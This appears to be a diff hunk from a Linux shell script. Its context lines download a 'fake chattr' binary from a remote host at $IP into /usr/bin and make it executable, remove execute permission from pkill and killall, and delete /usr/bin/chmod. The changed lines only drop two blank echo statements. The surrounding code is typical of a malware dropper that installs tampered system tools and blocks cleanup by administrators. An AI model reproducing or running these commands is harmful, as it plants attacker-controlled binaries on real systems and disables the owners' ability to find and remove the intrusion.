@@ -58,11 +58,9 @@ cd /usr/bin && wget http://$IP/chattr && chmod +x chattr
 echo
 echo "------------------Fake chattr successfully added-----------------"
 echo "-----------------------------------------------------------------"
-echo
 chmod -x /usr/bin/pkill
 chmod -x /usr/bin/killall
 rm -rf /usr/bin/chmod
-echo
 echo "-----------------------------------------------------------------------------"
 echo "-----------------------------------------------------------------------------"
 echo
